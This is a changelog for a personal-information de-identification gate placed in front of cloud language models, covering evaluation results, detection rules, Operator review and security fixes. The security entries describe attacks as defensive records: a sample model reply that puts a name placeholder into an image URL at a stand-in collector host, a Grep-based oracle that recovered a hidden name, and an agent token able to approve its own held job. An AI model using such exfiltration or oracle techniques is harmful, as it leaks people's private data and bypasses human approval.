# Changelog

All notable changes to themis-shield. Dates are day-first (DD/MM/YYYY).

## Unreleased

### Steward's decision after the second review (RC-01 to RC-08, 13/11/2026)

Two rounds of independent review showed that judging "general rule or statement about a specific person" with rules
is not safe: each narrowing left another sentence shape that releases a person's sensitive information. A leak is
worse than friction, so the passes that remove a hold on that judgement are off by default.

- **`policy-statements` is opt-in (off by default).** Not safe for release decisions: a rule-based genericity test
  misses sentence shapes; see RC-01 ("Staff are expected to remember that the cook has epilepsy." was ASK in 0.4.0 and
  RELEASE with the switch on) and RC-03 (its over-strictness on plain policy text). A model-based check with
  abstain-to-hold is the planned replacement. The code and the switch stay (`[detection] fixes` naming it, or `"all"`).
  With the defaults, the three split G clean documents it released are held again (ASK:sensitive), as in 0.4.0.
- **The general-rule exemption of `negative-statements` is opt-in (off by default)**, under its own switch
  `negative-statements-general-exemption` (the DD-26 change and its FAB-02 narrowing, split out). Same reason: see
  RC-02 ("Parents with no criminal record can be considered for kinship care of Jayden." and "Tenants that have no
  criminal history can stay at 14 Wattle Street." were ASK in 0.4.0 and RELEASE with the exemption). With the defaults
  every negative the `negative-statements` vocabulary reads is a statement again, as in 0.4.0; split G's GT-008 (a
  clean FAQ rule) is held again, and the DD-26 split G guard is a strict expected failure once more (it passes with
  the switch on).
- Regression tests (`tests/test_default_holds_rc01_rc02.py`): RC-01's ten sentences and RC-02's five are ASK
  (sensitive) under the default switches, as in 0.4.0. The same file records, per opt-in configuration, which of them
  the switches still release (all but the one with a found name, for RC-01 with `policy-statements`); that table is a
  record, not a target.
- **RC-04** the Operator's Undo is atomic with respect to "Replace it" and "Not personal": one lock per job covers the
  three, and an undo that removes a placeholder marks the review text stale before it writes the register (restored if
  the write fails). A replace from a second tab that arrived inside the undo was taken as "confirm as it is" and the
  value later went out in clear; it now waits for the undo and is refused (`REVIEW_REBUILD_REQUIRED`). Tested with a
  forced interleave from another thread and inside the register write.
- **RC-05** "Not personal" needs the current review text on screen, like "Replace it" and reveal: after a restart, once
  the conversation expired or for an older package it is refused with the value-free `REVIEW_UNAVAILABLE`, and the
  console disables the button while the text is unavailable. Before, only an in-memory stale flag was checked, so a
  point could be settled blind (and after a stale undo and a restart the flag was gone too).

### Fixes from the independent review of this candidate (FAB-01 to FAB-14, 13/11/2026)

The development-set measurements below passed while FAB-01 and FAB-02 released statements about specific people, so
each of these fixes is guarded by the reviewer's own reproductions as regression tests, not by a score. Principle for
any change that removes a hold or a finding: it must never release a statement about a specific person; in doubt the
hold stays. Nothing here was re-measured on a split.

- **FAB-01 (High)** `policy-statements` dropped a sensitive finding whenever a general rule shared its clause ("The cook
  has no criminal record and staff are expected to ...", "Amira Haddad, the payroll officer, is not a member of any
  union and staff are expected to ..."): 0.4.0 ASK became RELEASE. Now the clause that carries the statement must
  itself be the rule, with only lead-in words before its generic subject; a definite noun phrase before the verb, any
  pronoun (they/them/their added) or a PERSON/QUASI_ID finding anywhere in the sentence keeps the finding. 17 probe
  sentences must hold ASK:sensitive (`tests/test_policy_statements.py`), and a guard reads the 1,846 gold sensitive
  spans whose sentence names a person or a definite role (`tests/test_specific_subject_guard.py`).
- **FAB-02 (High)** the DD-26 change to `negative-statements` read a bare plural subject as a rule ("Parents have no
  criminal record.", "Carers have never been charged."). A plural is generic now only with "with/who/that" and either
  a quantifier ("all", "any") or a modal rule after the negative ("may", "can", "are not required", "need not"). Ten
  must-hold sentences; the same guard asserts the exemption never fires on a named or definite-role sentence. DD-26's
  split G guards still pass.
- **FAB-03 (High)** Replace, rebuild, Undo, Replace again sent the replaced value in clear while the point read
  "replaced". An undo that removes a placeholder now drops the stale review text; every point action is refused until
  the requester re-sends (`REVIEW_REBUILD_REQUIRED`), and "confirm as it is" needs a placeholder still in the codebook.
- **FAB-04** README and ARCHITECTURE now say that with `before_human` on the cloud model reads the de-identified package,
  held points included, before any person approves it, and that "nothing is sent" after a stop holds only with it off.
- **FAB-05** `[tripwire] enabled = true` (deprecated; now means `before_human`) prints a value-free start-up warning and
  logs it (`TRIPWIRE_ENABLED_ALIAS`).
- **FAB-06** the correction loop vaults only plausible personal values (at least three letters or digits, not a common
  word, never a span that cuts a word); a fragment is listed for the Operator instead. The reviewer's 120-seed hostile
  fuzz now keeps every invariant.
- **FAB-07** a weaker category over a stronger placeholder (`REPLACEMENT_CATEGORY_WEAKER`) and undoing the first of two
  same-value replacements (`PLACEHOLDER_SHARED`) are refused when the Operator acts, instead of refusing the job later.
- **FAB-09** known-miss shape rules classify by the matched alternative, so a value starting with a letter-number or a
  fraction ("Ⅷ...", "½...") is no longer written into the rule as itself.
- **FAB-10** reveal is refused once the job is closed (`REVIEW_CLOSED`).
- **FAB-13** the version is `0.5.0.dev0`, and "approval needs every point settled" is scoped to the web and `/v1` path.
- **FAB-14** the "Operator replacement applied" check runs on the first build, before the loop sends anything.
- Open, in [DEV-DEBT](docs/DEV-DEBT.md): FAB-08 (DD-27), FAB-11 (DD-28) and the reviewer's further suggestions (DD-29
  to DD-31).

### Cloud trip-wire: a correction loop before approval (development, unmeasured)

The optional cloud trip-wire (still off by default) no longer stops a job on its first flag after approval. It now
runs once the gate has de-identified a package and before any person confirms or approves it: it checks the whole
package and collects every finding, replaces each flagged span with a placeholder of the category it reported (the
original goes into the conversation vault; the register records the placeholder ids each round added), and checks the
corrected package again until a round finds nothing. After at most 3 rounds (`[tripwire] max_rounds`, 1 to 3) a
package still flagged, or one where a round could replace nothing, goes to the Operator marked NOT CONVERGED (new
reason `TRIPWIRE_NOT_CONVERGED`). The held response and `themis tripwire list` show what each round added
(categories, counts, placeholder ids, proposal ids; never values). Every finding with text becomes a proposed
known-miss entry (source `cloud_tripwire`; a keyed fingerprint or a shape rule, never the value), which changes nothing
until a person verifies it. Malformed replies, replies containing an original value and transport failures still
refuse the job; a finding called `SECRET` refuses it (`BLOCK:secret`); a package built while the trip-wire was off is
refused once it is on (`TRIPWIRE_NOT_RUN`). `themis tripwire review` now records a verdict per flagged round without
moving the job, and `stats` counts converged and not-converged loops. New register table `tripwire_loops`. The
trade-off is stated plainly: the cloud model now reads the package before a person has approved it. With the
trip-wire off the router is unchanged (`tests/test_catalogues_off.py`). Not measured on any split.

**Two independent toggles (project owner, 13/11/2026).** `[tripwire] before_human` is the correction loop above.
`[tripwire] after_human` runs once on exactly the package the requester and Operator approved, just before the task
turn (where 0.3 ran it): it collects every finding, replaces nothing (a person approved that package), and sends the
job back to the Operator (Held, `TRIPWIRE_FLAGGED`) with every finding listed and proposed to the known-miss register;
`themis tripwire review JOB --reapprove` sends the same package unchanged, `--refuse` refuses the job. Both default to
false and may be on together. `enabled` is deprecated: read only when neither toggle is set, `true` then means
`before_human` only (in 0.3 and 0.4 it meant the check after approval: set `after_human = true` for that).
`tripwire_records` gains a `stage` column (older rows default to `after_human`); `themis tripwire list` shows it.

### Operator review, point by point

- **Show the triggers.** For a held (ASK) job the Operator console shows the de-identified text with each hold
  trigger highlighted, a one-line plain-English reason beside it (from a fixed catalogue, for example "a statement
  about someone's health" or "the detectors disagreed on whether this is a name") and its place (paragraph, line).
  The points are built on the server from the decision evidence (`review.py`) and recorded value-free in the
  register (`register/review_records.py`: positions, categories, decisions and who; append-only).
- **Originals, carefully.** For a highlighted point the signed-in Operator (Operator credential only) may reveal the
  original. It is returned to that request only and shown on that screen; never written to the register, audit
  records or logs, and not kept by the page.
- **Three actions per point:** "Not personal: leave it", "Replace it" (the span becomes a placeholder in the job's
  codebook marked `de-identified-by-operator`; the package is rebuilt on the next send and must contain it) and
  "Stop the document" (the job is refused). No stage is approved while a point is unsettled; the register enforces
  this on every approval path for jobs that have points: the web and `/v1` path. Jobs from the Claude Code hooks
  path record no points yet and are approved as a whole, as in 0.4.0 (FAB-13). Two-stage approval, refusal and escalation are otherwise unchanged.
- **End states.** Jobs report `end_state`: `stopped`, `de-identified-and-released` or `released-as-is` (`null` while
  open).
- **No learning by itself.** Replacements stay in their job's codebook. "Not personal" verdicts are counted per hold
  reason (`themis operator stats`); nothing promotes them to the false-positive catalogue automatically.
- Test helpers: the synthetic Operator (`MemoryRegister.approve`, `operator_decides` in the live-cloud tests) now
  settles open points as "not personal" before approving, as the console requires.

### Operator console: trip-wire rounds, re-approve after a flag, undo a point (development, unmeasured)

- **Trip-wire rounds in the job's card.** With the cloud trip-wire on, the Operator console now shows inside each
  job's card what every correction round (`before_human`) found and added: counts per category, the placeholder ids
  it added, known-miss proposal ids and each finding (never a value), with NOT CONVERGED shown as a warning. The
  placeholders the loop added are highlighted in the text with their round and listed as settled by the trip-wire
  (new point reason `REPLACED_BY_TRIPWIRE`); they are not new open points. A finding the loop did not replace is
  highlighted only when its place in the text is exact, otherwise listed. After an Operator replacement made the loop
  run again, earlier loops are folded below the current one.
- **Check after approval, from the console.** A package the `after_human` check sent back (`TRIPWIRE_FLAGGED`) now
  appears in the Operator queue with its findings, and the card offers "Re-approve this package" (sent unchanged,
  without another check) and "Refuse the job": the same verdicts as `themis tripwire review --reapprove` /
  `--refuse` (new routes `POST /api/operator/{job}/tripwire/reapprove` and `/refuse`).
- **Undo a mis-clicked point.** Until stage two of the package is approved, an Operator may undo a point's "Not
  personal" or "Replace it" (`POST /api/operator/{job}/points/{point}/undo`, an Undo button in the console). The undo
  is recorded (who, when; new append-only tables `review_undos` and `review_undo_actors`; `review_resolutions` gains an
  `attempt` column) and the point is open again. Undoing a replacement removes its placeholder from the job's codebook
  so the next package rebuild excludes it. A stop is never undone; a replacement made before a restart, or whose
  placeholder is already in use elsewhere, cannot be undone. `themis operator stats` counts undone settlements.
- With the trip-wire's correction loop on, the Operator review is built from the loop's final package (the merge of
  the two features passes the review draft through every real package build). Not measured on any split.

### Split G result (eval-kit-v0.6-frozen): 0.4.0 as released fails its frozen rule

0.4.0 as released **fails** its frozen rule on split G ([results](eval/RESULTS-v0.6.md)), the first fresh split to
test it, on three conditions: sensitive recall 0.939 (limit 0.95; 4 statements short), clean friction 0.308 (limit
0.15; 20 of 65 clean documents held) and over-redaction 615 against the control's 613. **Released leaks 0** in every
arm (every missed span sat in a held document), R_any 0.9915, quasi-identifiers 1.000, and every ratchet condition
against 0.3.4 holds. Split G was written and labelled by non-Claude families (half R `kimi-k3` / `deepseek-v4-pro`,
half T `glm-5.3` / `deepseek-v4.1-flash`, 180 cases pooled); a third half was dropped before sealing and half T was
accepted at 88 cases, both recorded in the plan before any arm ran. Split G (`eval/cases/test-g-r.jsonl`,
`test-g-t.jsonl`, pipeline under `eval/generator_g/`) is published and is now development data. No code changed.

### Secret-manager references in clean configuration files (split G friction)

- `secret-config-lookalikes` (no new switch): on split G, six of the 65 clean documents were configuration files BLOCKed
  for `secret` although every secret-looking value in them is a reference to a secret manager. Three more reference
  forms are no longer read as secrets (from any detector): a `${NAME:path}` lookup (`"${SECRET_MANAGER:prod/app/db/password}"`),
  a template lookup written with a colon (`{{ vault:kv/app#password }}`, quoted or not), and a URI of a non-web scheme
  made only of lower-case words under a key whose last word names a credential (`broker_password: "sm://org/prod/broker-password"`;
  before, only under a key that says it is a reference, such as `credentialRef`). So are the pieces the finders cut out
  of such a reference: a fragment wholly inside it (`prod/app/db/password}"`, `:org/prod`, `vault:kv/x#password`) and the
  key of the assignment with its quotes and `:` or `=` (`finance_api_key:`). Written as narrowly as the existing forms:
  a path of lower-case words (at least three after a `${NAME:`, so a two-word Spring default such as `admin/admin`
  stays a literal; at least two otherwise), no user, password, query, host with dots or letters
  run into digits, and a web scheme never counts. A literal after the same keys, `user:pass@`, an `https://` URI, a path
  with a high-entropy segment, a literal beside a reference on the same line or on another line, a literal in a trailing
  comment (when a detector marks that literal; FAB-08: the look-alike itself no longer blocks the line), a value-less key line and a lone padded base64 key still BLOCK (COR-001), and no gold SECRET span in
  `eval/cases` passes the rule. `--detection-fixes` without the switch restores the previous behaviour byte for byte.
  Measured by replay as development evidence only (written from split G's six documents): split G friction
  0.308 -> 0.246 (four of the six released; GR-083 is now held only for a sensitive finding and GR-098 still for
  fourteen `code:` values PII-Tracer alone reads as secrets and for its injection signal), every safety measure unchanged.

### General policy statements are not sensitive statements (split G friction)

- `policy-statements` (new switch, **opt-in since the steward's decision above**; narrowed by FAB-01 above, the clause
  that carries the statement must itself be the rule): a sensitive finding, from any detector, is dropped when the clause it lies
  in is plainly a general rule about a class of people and about no one in particular (taxonomy section 3: a statement
  is labelled only when it is about a person; section 4's `policy_statement`, "staff with a disability can request
  reasonable adjustments"). Fixed wording only: a generic subject (staff, employees, applicants, "any employee",
  "anyone who", "union matters", "the College does not ask whether any employee ...") followed by a modal or generic
  verb ("can request", "may apply", "are entitled to", "is treated as", "are governed by"), and nothing personal in
  the clause (no pronoun, no name or PERSON or QUASI_ID finding, no "the only", "sole" or "one", no "a staff member
  at ...", no speech verb such as "asked" or "said"). A finding across sentences, a sensitive-column cell and a finding
  with any other label are never dropped. Guard: over every evaluation set (split G adjudicated), none of 3,248 gold
  sensitive spans, nor the sentence around each, reads as a general rule. Measured by replay as development evidence
  only (written from split G's three documents): split G friction 0.246 -> 0.200 (GR-083, GT-083 and GR-034
  released), over-redaction 615 -> 611, every safety measure unchanged.
### Indirect and negative sensitive statements (split G's sensitive misses)

- `indirect-statements` (new default switch): a sensitive statement that does not name its category, in the
  taxonomy's own examples, is a statement of it: `did eighteen months inside`, `"doing time inside"`, `is on` or
  `completed a community corrections order`, `is on parole`, `was granted bail`, `sees his parole officer`
  (CRIMINAL); `leaves early on Fridays for Shabbat`, `observes the Sabbath`, `keeps kosher`, `eats halal`, `his halal
  meal` (RELIGION); `carries the delegate's card for the wharf crews`, `I am the delegate contact for outdoor staff`
  (UNION). Each needs a person: a singular or personal verb form, or (for time inside, Shabbat and halal or kosher) a
  personal pronoun in its clause; a modal, `if` or `any applicant` before it (policy: "staff on a community corrections
  order may apply", "the canteen offers halal options"), a sentence about an organisation and a document that presents
  itself as fiction never match. The span is the predicate phrase, cut before a following `and`, `but` or `because`.
- `negative-statements` (no new switch) also reads `has never been the subject of any police check` (CRIMINAL), `does
  not have any other court orders` (FAMILY_VIOLENCE near a protection or intervention order, otherwise CRIMINAL; never
  in a paragraph about a company), `has no family violence indicators on file`, and a whole `Yes` or `No` after a form
  line that ends with `:` and speaks of a person (`4.4 I do not identify as Aboriginal or Torres Strait Islander: No`;
  never a requirement line such as `Police check required: Yes`).
- Fixed vocabulary from the taxonomy's wording, never a learned list. Over every evaluation set (split G adjudicated)
  the new vocabulary makes 105 spans (dev 5, test 5, C 3, D-q 10, D-c 24, E 13, F 18, G 27), none over a hard negative
  or in a clean document, each on a gold span of its own category but one (GR-097 quotes the statement whose
  restatement is gold; recorded in the guard). Left to the finders, as no rule reads them safely: split G's Japanese
  family-violence statement, "home before sundown", an address kept off letters, "his partner" and a fees deduction.
  Measured by replay as development evidence only (written from split G): split G sensitive R_any 0.939 -> 0.967
  (308 -> 317 of 328), R_any 0.9915 -> 0.9948, R_full 0.954 -> 0.957; friction, over-redaction and decisions unchanged.

### Three 0.4.0 switches that overreached on split G (DD-26)

- Split G's guards of `negative-statements`, `quasi-cells` and `unique-roles` failed on five cases, adjudicated against
  the taxonomy (`eval/generator_g/adjudication/decisions-dd26.jsonl`): three were gold omissions (corrected in
  `test-g-*.adjudicated.jsonl`; the sealed files stay as they were) and two were switch errors, fixed here with no new
  switch. `negative-statements` no longer matches a negative inside a general rule about a class of people ("A person
  with no criminal record at all is treated the same as any other applicant once the check is returned as clear", in a
  clean FAQ): only a generic subject (a person, any applicant, anyone who, or a plural marked as a class: narrowed by
  FAB-02 above; **opt-in since the steward's decision above**, switch `negative-statements-general-exemption`) before
  it in its sentence, nothing personal in the sentence and no ":" after it; a name, "He", "I", an appositive ("Priya Nand, a
  person with no criminal record, ...") and a list under a generic heading still match. `quasi-cells` widens a partial
  finding only to the clause of the cell that holds it, so a ";" inside a cell ends it (GT-081's second clause ended in
  a role title).
- `unique-roles`: a "who" clause that was cut at 50 characters ("the only apprentice in this cycle's hairdressing cohort
  who grew up", gold "... speaking Mandarin at home") now runs to the auxiliary verb that follows it ("has requested") or
  to the end of its cell or line, within 120 characters. Prose punctuation does not end it: that cannot tell a clause
  from the main verb the list does not know ("who started in February in the back office signed up with the union."),
  and a first version that ended at it ran into four such main clauses on the older sets. Over every evaluation set it
  changes two spans (GT-027 and GR-090, a table cell that now ends at its tab). "-" and "—" were not made clause ends: no
  widened cell on any set holds one.
- The three split G guards read the adjudicated files and are strict (they were strict expected failures); the
  floors of the earlier sets are unchanged (41 statements covering 56 gold spans, 329 cells completing 329 gold spans,
  124 spans on 124 gold spans), and split G's now hold at 15 / 17, 54 / 54 and 20 / 20. Measured by replay as development
  evidence only (split G, from the frozen candidate's captures): friction 0.200 -> 0.185 (GT-008 released), over-redaction
  611 -> 610 (GT-081's role title); released leaks 0, R_any 0.9948, R_full 0.9569, sensitive R_any 0.9665 and
  QUASI_ID R_any 1.000 all unchanged.

## 0.4.0 (12/11/2026)

**Preview, like every release before it.** Split F, the frozen test of this release's candidate (0.3.4 plus
`joined-terms`), **failed** its rule on four conditions: released leaks, sensitive recall, quasi-identifier recall and
clean friction ([results](eval/RESULTS-v0.5.md)). Every change after the kit tag `eval-kit-v0.5-frozen` (the review
fixes, `location-columns`, `secret-config-lookalikes`, `propagate-detection-view`, the three split F switches, the
Operator credential, the native Messages leg) is a development measurement only, several of them on split F itself,
which they were written from; no fresh split has tested 0.4.0. A vetting record still quotes 0.3.0's frozen FAIL as
its method baseline.

### Split F result (eval-kit-v0.5-frozen)

The candidate (0.3.4 plus `joined-terms`) **fails** its frozen rule on split F ([results](eval/RESULTS-v0.5.md)), on
four conditions: 12 released leaks (9 from one table's postcode column), sensitive recall 0.937 (limit 0.95),
quasi-identifier recall one span behind the control, and clean friction 0.2125 (limit 0.15). The previous-release
arm, the same finder answers with `joined-terms` off, shows the fix alone: every organisation-issued identifier
protected whole (R_full on them 0.553 -> 1.000), released leaks 13 -> 12, no measure worse. Split F
(`eval/cases/test-f-o.jsonl`, pipeline under `eval/generator_f/`) is published and is now development data.

The review fix to `secret-references` below (COR-001) came after the kit tag and is not part of that run; on the
development sets it changed no safety measure and held one more clean document on each split D half (friction
0.064 -> 0.079 and 0.161 -> 0.177), until the follow-up fix below restored 0.064 and 0.161.

After every change in this release, a replay of the frozen candidate's split F finder answers gives 1 released span
(was 12), sensitive recall 0.961 (0.937), quasi-identifier recall 0.955 (0.929) and friction 0.150 (0.2125), with
over-redaction unchanged. Those changes were written from split F's misses, so this is development evidence, not a
test result.

### Split E result (development: 0.3.4 now has a fresh-split verdict)

0.3.4 **fails** its frozen rule on split E ([results](eval/RESULTS-v0.4.md)): 12 released leaks, all the
organisation prefix `KWA-` left beside a substituted staff number (DEV-DEBT DD-17), and one more look-alike touched
than 0.3.0. Every other condition passed, including sensitive recall 1.000 and clean friction 0.083. Split E
(`eval/cases/test-e-k.jsonl`, generator under `eval/generator_e/`) is published and is now development data.

### Organisation terms joined to an identifier (DD-17)

- `joined-terms` (on by default): the institutional allow-list no longer trims an organisation's own term off a finding
  when the term is joined to the rest of the value by a hyphen, dash, underscore, slash, backslash or by nothing, so the
  `KWA` of the staff number `KWA-EMP-92315` is substituted with the rest and `KWA-` is not left in clear. A term that is
  the whole value, or is set apart by a space or punctuation ("Priya Kimura, KWA"), is trimmed as before.
  `--detection-fixes` without it (or `fixes = "none"`) restores the 0.3.4 behaviour byte for byte.

### Location columns in "anonymised" tables (from split F)

- `location-columns` (on by default): in a table the gate recognises, a column whose header names where a person lives
  (`residence_postcode`, `home suburb`, `postcode of residence`, `home address`, `residential town`,
  `place of residence`, `lives in`) is protected as an address, every non-empty cell. On split F an anonymised leavers
  table was released with its nine bare residence postcodes in clear, while the dates and roles beside them were
  protected. A header that names a workplace, site, office, branch, depot, campus, ward, delivery, return or business
  location is not matched, and neither is a bare `postcode` or `suburb`, which is often a site's. Run over every case
  in `eval/cases`, the pass protects 351 cells, 310 of them gold spans, and touches no hard negative.
  `--detection-fixes` without it restores the previous behaviour. Measured by replay as development evidence only
  (it was written from split F's miss): split F released leaks 12 -> 3, R_any 0.989 -> 0.991, friction and
  over-redaction unchanged; split E and the four other development sets identical on every measure.

### Negative statements, unique roles and partial table cells (from split F's weakest safety areas)

Three new detection switches, on by default, each written from split F's misses (development data) with fixed
vocabulary or document structure only. `--detection-fixes` without a switch restores the previous behaviour.

- `negative-statements`: a statement that a person does not have a sensitive attribute is a statement of that
  category (the finder prompt already says so; the finders found 47 of split F's 60): `is not on any medication`,
  `No regular medications`, `denies any thoughts of self-harm` (HEALTH); `No disclosable court outcomes`, `has never
  been charged`, `the police certificate shows no matters` (CRIMINAL; "matters" and "outcomes" only near a police,
  court, conviction or criminal word, never in a paragraph about a company); `is not experiencing family violence`;
  `am not a member of any union`; and a whole `No` answer after a question about Aboriginal or Torres Strait Islander
  origin, ethnicity, criminal history, union membership or disability (never `Yes / No` options). Over every case in
  `eval/cases`: 42 statements, each on a gold span of its own category, none on a hard negative or a clean document.
- `unique-roles`: a role only one person holds (`the only analyst on the overnight roster`, `the one contractor
  seconded from ...`, `Sole night-shift pharmacist at ...`) is a QUASI_ID, in prose and in table cells. Over
  `eval/cases`: 124 spans, each on a gold QUASI_ID, none on a hard negative.
- `quasi-cells`: a QUASI_ID finding that covers only part of one table cell is widened to the whole cell (split F
  released the rest of two role descriptions beside the half the finders marked). PII-Tracer's QUASI_ID label alone
  is not widened (it marks single sensitive words). Over `eval/cases`, given the first half of every gold QUASI_ID:
  329 cells, each completing its gold span, none on a hard negative.

### Clean configuration files held as secrets (split F friction)

- `secret-config-lookalikes` (on by default): on split F, six of the 80 clean documents were BLOCKed for `secret`, all
  configuration or code files. Four shapes a rule can tell from a credential are no longer read as one (from any
  detector): a template call to a secret manager (`{{ vault 'kv/app/db#password' }}`, `{{ vault('kv/app/db', 'password') }}`),
  a URI of a non-web scheme made only of lower-case words under a key that says it is a reference
  (`credentialRef: "keyhold://kv-prod/edge/syd#admin"`), a path of lower-case words that is a directory (`kv/team/prod/`)
  or a configuration file (`deploy/environments/production.yaml`), and a camel-case key name
  (`targetCPUUtilizationPercentage: 65`). The same shapes as a value after `password:`, a literal key in a trailing
  comment, a lone base64 key and a key alone that is not such a name still BLOCK (COR-001), and no gold
  SECRET span in `eval/cases` passes the new rules. One of the six (`code: DC-SYD`, read as a secret by PII-Tracer
  alone) cannot be told from a verification code by any rule and is left held. `--detection-fixes` without the switch
  restores the previous behaviour byte for byte.
  Measured by replay as development evidence only (written from split F's six clean configuration files): split F
  friction 0.2125 -> 0.150 (five of the six now released; the sixth, distribution-centre codes under a `code:` key, is
  left held because a rule cannot tell it from a recovery code), every safety measure unchanged; split E and the four
  other development sets identical on every measure.

### Fixes from the 11/11/2026 independent review

- **DD-18 (COR-011), restoration halved text the cloud model wrote itself.** The gate doubled every `:`, `\`, `⟦` and
  `⟧` in outbound text and restoration halved them on the way back, so a model-written `std::vector` came back as
  `std:vector`, `::1` as `:1` and a doubled backslash as one, with a clean report; every colon the cloud read was
  doubled too (`10::30`). Now only what restoration could read as a placeholder is escaped: the delimiters (doubled), a
  class letter standing alone followed by a colon and a hex digit (`P:7f3a1c` goes out as `P:::7f3a1c`) and an odd run
  of backslashes before a delimiter or a placeholder (two more). Every other character goes out as written and
  restoration undoes only those escapes, so C++, Rust and PHP scope operators, IPv6 addresses and doubled backslashes
  (four in a row too, as in a string literal) come back as written, and `10:30` is sent as `10:30`. Document text
  shaped like a placeholder still comes back byte for byte and is never restored into a value. Unchanged: a
  model-written `⟦⟦` or `⟧⟧`, three colons after a standalone class letter, and an odd run of three or more
  backslashes before a delimiter or a placeholder are read as the gate's own escape. The strict xfail
  `test_model_written_double_colon_survives_restoration` now passes (marker removed).
- **SEC-02, tool parameters in wrapper form.** A tool's `function.parameters` given as `{"name", "strict", "schema"}`
  (the wrapper that local JSON output accepts) was not scanned: the inner schema's descriptions, titles, enum and
  const values and the wrapper's `name` reached the cloud verbatim, past detection and substitution. The chat
  boundary now refuses that form for tools (`UNSUPPORTED_TOOL`, the request is blocked and nothing is sent); a bare
  schema is accepted and scanned as before.
- `python -m themis_shield.hooks` read Claude Code's UTF-8 JSON and wrote its reply through the text streams, which on
  Windows without UTF-8 mode are cp1252 (PKG-01). The rules scanned mojibake, so a TFN in full-width digits or with a
  zero-width space inside was not found (with `[hooks] cloud_authorised` the original prompt then went out; the default
  closed policy refused it); a reply with text outside cp1252 was written
  as invalid UTF-8 or failed. The hook now reads `sys.stdin.buffer` and decodes strict UTF-8 (a decode error is refused
  like malformed JSON) and writes its reply as UTF-8 bytes. The input limit (1,048,576 characters) is unchanged. The
  managed settings example also sets `PYTHONUTF8=1`, as a second layer.
- `secret-references` (COR-001): a SECRET finding is dropped only when its span lies in the reference part of the
  assignment's value, not when the whole line parses as a reference. Before, two shapes released a real secret in the
  default configuration: a literal key in a trailing comment after an environment lookup
  (`API_KEY = os.environ["API_KEY"]  # old: <key>`, also with `//`) and a padded base64 key alone on its line that ends
  in a single `=` (read as a key with no value). A span that reaches into the stripped comment, a span in the key alone,
  and a span over the key of a value-less line now keep SECRET. A span over the key and the reference together, and a
  span cut out of the reference, still pass. This is a detection change, measured on the development sets afterwards.
- `secret-references` (COR-001, friction): the span rule above also held two clean documents on the development sets,
  both finder answers that tagged only a variable name (`SECRET_KEY` in `SECRET_KEY = os.environ["SECRET_KEY"]`; the
  keys `DEPLOY_TOKEN` and `REGISTRY_PASSWORD` in a CI `env:` block of `${{ secrets.X }}` values), which the old
  line-level rule had dropped. A SECRET finding whose span lies wholly within the key of an assignment whose value is a
  non-empty reference is dropped again (the key is a plain identifier: letters, digits, underscore, hyphen, dot). A key
  with no value, a key beside a literal value, a span that runs on past the key and a secret in a trailing comment
  keep SECRET as before. This corrects the same switch; there is no new one, and `--detection-fixes` without
  `secret-references` is unchanged.
- SEC-01: in hooks mode, PreToolUse now denies the search tools Glob and Grep (only Read is allowed through). Their
  match counts and file lists carry no personal value, so the post-tool re-scan passed them, but under an approved job
  each call was a yes/no oracle over the raw contents and names of every file under `[hooks] roots`: a reviewer
  recovered a de-identified name character by character in 94 Grep calls. Their PostToolUse output profiles stay, so
  any output that still arrives is re-scanned. `allowed_tools` still accepts both names; they are denied regardless.
- **SEC-03 / R-01, placeholders inside URLs are not restored.** Restoration put the real value back wherever the cloud
  reply wrote a placeholder, so a reply such as `![status](https://collector.example/p.png?n=⟦P:...⟧)` came back with
  the real name in the image address and a clean report. A client that rendered the reply then sent the name to that
  host. Now a placeholder inside a URL stays as the placeholder: in a scheme run (`https://...`, `mailto:`, `data:`,
  ...), a markdown link or image target, or an HTML `src`/`href`/`action` value. The same applies to each tool-argument
  string. The restoration report counts these as `withheld_in_url`, and the router returns that count in its `themis`
  object next to `unknown_tokens`. A placeholder next to a URL is restored as before. Commands, code and other non-URL
  contexts are still restored as written (SECURITY "Known limits").
- **SEC-04 / R-02, a separate Operator credential.** The `/v1` bearer token (`gate-token`) also drove
  `/api/operator/*/approve`, so the API client, or any agent that could read the token, approved its own held job. Every
  `/api/operator/*` endpoint (approve, refuse, escalate, the queue) now needs the Operator credential: the new
  `operator-token` (created beside `gate-token` on first start, same format and checks; a malformed one, or one equal to
  the gate token, refuses the start with `OPERATOR_TOKEN_UNAVAILABLE`) or an Operator browser session opened with a
  one-use code that only that token can mint (`themis serve --open-operator`). The gate token and the chat session from
  `--open` get 403 `OPERATOR_CREDENTIAL_REQUIRED` and nothing changes; the Operator token is refused on `/v1`, the hooks
  API and the app's writes. Both files sit under the same OS user's profile: a separation of credentials, not proof of
  a second human.
- `propagate-detection-view` (on by default; COR-002, DD-19): name propagation and the table name, identifier,
  quasi-identifier, location and statement passes read the raw text, not the detection view, so one zero-width space or
  soft hyphen (common in text copied from a PDF) in a table header or in a later mention switched that protection off:
  `Name,Licen<U+200B>ce Number,Site` released its licence numbers, `Na<U+200B>me` found no name cells, and a later
  `Lind<U+200B>ahl` (or a soft hyphen, or a full-width `Lindahl`) stayed in clear after `Maria Lindahl` was found. Those
  passes now run on the view (invisible characters removed, NFKC per character), the findings that come in are mapped
  into it first, and every span they make maps back to whole source characters, the invisible ones inside it included.
  Text the view leaves unchanged is read as it is, byte for byte. `--detection-fixes` without it restores the previous
  behaviour. This is a detection change, measured on the development sets afterwards.

### Native Anthropic Messages leg (ROADMAP: Later)

- `api = "anthropic-messages"` in `[cloud]` (`CloudSettings.api`, default `openai-compatible`, unchanged) sends to
  `POST <base_url>/messages` (`base_url = https://api.anthropic.com/v1`) with `x-api-key`, read from the configured
  environment variable by the same `ApiKeyCredential`, and `anthropic-version: 2023-06-01`; no `Authorization` header.
  The router, register and approvals are untouched: approvals stay bound to the hash of the OpenAI-shaped package, and
  `CloudClient.open` translates that package at send time (system and developer messages become the top-level `system`
  text, `max_completion_tokens` becomes `max_tokens`, `stop` becomes `stop_sequences`; a temperature above 1, a message
  `name` or any other field with no Messages equivalent is refused with `UNSUPPORTED_REQUEST`, and tools or tool
  results with `UNSUPPORTED_TOOL`, nothing sent). `verify_json` then runs on the translated bytes, so the last
  exact-value check sees every field that leaves, `system` included; the capture records what left, with its own hash.
- The reply (streaming `message_start` .. `message_stop`, or one JSON message) is translated into the chunks the router
  already restores, so restoration, URL withholding (R-01) and the reports are shared. `input_tokens` plus the cache
  counts become `prompt_tokens`, `output_tokens` becomes `completion_tokens`. Fail closed with the existing codes: an
  `error` event, an unknown event or block type or an out-of-order event is `CLOUD_PROTOCOL`, a non-200 status is
  `CLOUD_HTTP`, `max_tokens`/`pause_turn` or a stream without `message_stop` is `CLOUD_INCOMPLETE`, `refusal` is
  `CLOUD_REFUSED`. Thinking blocks, which the live API sent unasked, are dropped from the reply (never delivered,
